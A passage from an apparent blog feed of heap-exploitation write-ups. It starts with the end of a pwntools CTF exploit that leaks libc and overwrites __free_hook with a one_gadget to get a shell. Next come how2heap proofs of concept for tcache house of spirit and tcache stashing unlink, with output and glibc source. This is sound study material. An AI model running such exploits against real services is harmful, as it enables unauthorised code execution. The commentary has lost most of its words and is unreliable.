function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;null-byte-overflow&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0x10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;900&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line">main_arean=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">malloc_hook=main_arean-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;main_arean&#x27;</span>,main_arean)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base=malloc_hook-libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)+base))</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;fuck&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">one_gadget=base+<span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
            <tag> Null Byte Overflow </tag>
            
            <tag> Overlapping Heap Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache house of spirit &amp;&amp; Tcache stashing unlink attack</title>
      <link href="/2023/03/27/Tcache_house_of_spirit-unlink/"/>
      <url>/2023/03/27/Tcache_house_of_spirit-unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-house-of-spirit"><a href="#Tcache-house-of-spirit" class="headerlink" title="Tcache house of spirit"></a>Tcache house of spirit</h2><p>how2heap tcache_house_of_spirit.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Starting program: /mnt/hgfs/Share/how2heap/glibc_2<span class="number">.27</span>/tcache_house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack on tcache.</span><br><span class="line">It works in a similar way to original house of spirit but you don<span class="number">&#x27;</span>t need to create fake chunk after the fake chunk that will be freed.</span><br><span class="line">You can see this in <span class="built_in">malloc</span>.c in function _int_free that tcache_put is called without checking <span class="keyword">if</span> next chunk<span class="number">&#x27;</span>s size and prev_inuse are sane.</span><br><span class="line">(Search <span class="keyword">for</span> strings <span class="string">&quot;invalid next size&quot;</span> and <span class="string">&quot;double free or corruption&quot;</span>)</span><br><span class="line"></span><br><span class="line">Ok. Let<span class="number">&#x27;</span>s start with the example!.</span><br><span class="line"></span><br><span class="line">Calling <span class="title function_">malloc</span><span class="params">()</span> once so that it sets up its memory.</span><br><span class="line">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It&#x27;s size field is placed at 0x7fffffffdee8</span><br><span class="line">This chunk size has to be falling into the tcache <span class="title function_">category</span> <span class="params">(chunk.size &lt;= <span class="number">0x410</span>; <span class="built_in">malloc</span> arg &lt;= <span class="number">0x408</span> on x64)</span>. The <span class="title function_">PREV_INUSE</span> <span class="params">(lsb)</span> bit is ignored by <span class="built_in">free</span> <span class="keyword">for</span> tcache chunks, however the <span class="title function_">IS_MMAPPED</span> <span class="params">(second lsb)</span> and <span class="title function_">NON_MAIN_ARENA</span> <span class="params">(third lsb)</span> bits cause problems.</span><br><span class="line">... note that this has to be the size of the next <span class="built_in">malloc</span> request rounded to the internal size used by the <span class="built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="keyword">for</span> the <span class="built_in">malloc</span> parameter at the end.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdee8.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7fffffffdee8, which will be 0x7fffffffdef0!</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7fffffffdef0</span><br><span class="line">[Inferior 1 <span class="params">(process <span class="number">6552</span>)</span> exited normally]</span><br></pre></td></tr></table></figure><p>fastbin</p><p></p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327160459074.png" alt="image-20230327160459074"></p><h2 id="Tcache-stashing-unlink-attack"><a href="#Tcache-stashing-unlink-attack" class="headerlink" title="Tcache stashing unlink attack"></a>Tcache stashing unlink attack</h2><p>how2heap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">This file demonstrates the stashing unlink attack on tcache.</span><br><span class="line"></span><br><span class="line">This poc has been tested on both glibc <span class="number">2.27</span> and glibc <span class="number">2.29</span>.</span><br><span class="line"></span><br><span class="line">This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it<span class="number">&#x27;</span>s necessary to alloc a chunk with <span class="built_in">calloc</span> at least once. Last not least, we need a writable address to bypass check in glibc</span><br><span class="line"></span><br><span class="line">The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.</span><br><span class="line"></span><br><span class="line">This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this <span class="keyword">case</span> we<span class="number">&#x27;ll</span> create the chunk on the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">Stack_var emulates the fake chunk we want to alloc to.</span><br><span class="line"></span><br><span class="line">First let<span class="number">&#x27;</span>s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[<span class="number">2</span>] as the fake bk. Later we can see *(fake_chunk-&gt;bk + <span class="number">0x10</span>) which is stack_var[<span class="number">4</span>] will be a libc addr after attack.</span><br><span class="line"></span><br><span class="line">You can see the value of fake_chunk-&gt;bk is:<span class="number">0x7fffffffde30</span></span><br><span class="line"></span><br><span class="line">Also, let<span class="number">&#x27;</span>s see the initial value of stack_var[<span class="number">4</span>]:(nil)</span><br><span class="line"></span><br><span class="line">Now we alloc <span class="number">9</span> chunks with <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">free</span> <span class="number">7</span> of them in order to put them into tcache. Carefully we didn<span class="number">&#x27;</span>t <span class="built_in">free</span> a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins <span class="keyword">while</span> chunk0 and chunk2 will be put into unsorted bin.</span><br><span class="line"></span><br><span class="line">Now we alloc a chunk larger than <span class="number">0x90</span> to put chunk0 and chunk2 into small bin.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">malloc</span> two chunks to spare space <span class="keyword">for</span> small bins. After that, we now have <span class="number">5</span> tcache bins and <span class="number">2</span> small bins</span><br><span class="line"></span><br><span class="line">Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: <span class="number">0x7fffffffde20</span>.</span><br><span class="line"></span><br><span class="line">Finally we alloc a <span class="number">0x90</span> chunk with <span class="built_in">calloc</span> to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.</span><br><span class="line"></span><br><span class="line">Now our fake chunk has been put into tcache bin[<span class="number">0xa0</span>] <span class="built_in">list</span>. Its fd pointer now point to next <span class="built_in">free</span> chunk: <span class="number">0x6033a0</span> and the bck-&gt;fd has been changed into a libc addr: <span class="number">0x7ffff7dcdd30</span></span><br><span class="line"></span><br><span class="line">As you can see, next <span class="built_in">malloc</span>(<span class="number">0x90</span>) will <span class="keyword">return</span> the region our fake chunk: <span class="number">0x7fffffffde30</span></span><br></pre></td></tr></table></figure><p><strong>tcachesmall binmallocbktcachebin bin __glibc_unlikely (bck-&gt;fd !&#x3D; victim)</strong></p><p><strong>calloctcachebin</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;stack_var</span><br><span class="line"><span class="number">0x7fffffffde20</span></span><br><span class="line">&amp;chunk_lis</span><br><span class="line"><span class="number">0x7fffffffdea0</span></span><br><span class="line">&amp;target</span><br><span class="line"><span class="number">0x7fffffffde18</span></span><br></pre></td></tr></table></figure><ol><li><p>stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);0x7fffffffde380x7fffffffde30</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234406124.png" alt="image-20230327234406124"></p></li><li><p>malloc0xa0(malloc arg&#x3D;0x90)chunk0-8</p></li><li><p>chunk3-chunk8tcachebin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232412518.png" alt="image-20230327232412518" style="zoom:80%;"></li><li><p><code>free(chunk_lis[1]);</code>0xa0tcachebin7<code>free(chunk_lis[0]);free(chunk_lis[2]);</code>unsorted bin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232958585.png" alt="image-20230327232958585" style="zoom:80%;"></li><li><p><code>malloc(0xa0);</code>chunkunsortedbintcache0xa0chunksmall bin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233240585.png" alt="image-20230327233240585" style="zoom: 80%;"></li><li><p><code>malloc(0x90);malloc(0x90);</code>tcache</p></li></ol>   <img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233621133.png" alt="image-20230327233621133" style="zoom:80%;"><ol start="7"><li><p><code> chunk_lis[2][1] = (unsigned long)stack_var;</code>chunk2bk&amp;stack_var&#x3D;0x7fffffffde20</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233912304.png" alt="image-20230327233912304"></p></li><li><p><code>calloc(1,0x90);</code>FIFOsmallbinchunk0tcachesmall bintcachebin</p><p>small binchunk0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    <span class="comment">//  small bin </span></span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">//  victim = last(bin) small bin  chunk</span></span><br><span class="line">    <span class="comment">//  victim = bin  bin </span></span><br><span class="line">    <span class="keyword">if</span> ( ( victim = last (bin) ) != bin )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//  small bin  chunk </span></span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="comment">//  bck-&gt;fd  victim</span></span><br><span class="line">        <span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="comment">//  victim  inuse </span></span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">//  small bin  small bin  chunk </span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>chunk0bckchunk2,victimchunk0bck-&gt;fd !&#x3D; victimchunk2fdbkcode unlinkbin-&gt;bk &#x3D; bck; bck-&gt;fd &#x3D; bin;</p><p>chunktcache bin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//sizetcache</span></span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//tcache binsizetcache bin</span></span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//tcache bin</span></span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//small bin,tc_victimsmall bin</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;<span class="comment">//tc_victimbkbcktc_victimbk</span></span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;<span class="comment">//tc_victimsmall bin</span></span><br><span class="line">              bck-&gt;fd = bin;<span class="comment">//bckbck-&gt;fdbin(main_arena+96)</span></span><br><span class="line">              tcache_put (tc_victim, tc_idx);<span class="comment">//tc_victimtc_idx</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>bck-&gt;fd !&#x3D; victimchunkfdunlinkchunk2unlinkebckchunk 0x7fffffffde20bck-&gt;fd&#x3D;bin0x7fffffffde30bin(small bin)<strong>bkfd</strong></p><p> watch *(long *)0x7fffffffde30 </p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328012821048.png" alt="image-20230328012821048" style="zoom:80%;"><p>chunk 0x7fffffffde20unlinke bck<strong>1</strong>*0x7fffffffde300x7fffffffde40bin(small bin)</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013130739.png" alt="image-20230328013130739"></p><p>0x7fffffffde30small bintcache_put (tc_victim, tc_idx)0x7fffffffde20tcachebin0x7fffffffde30next</p><p></p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013046989.png" alt="image-20230328013046989"></p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234506290.png" alt="image-20230327234506290" 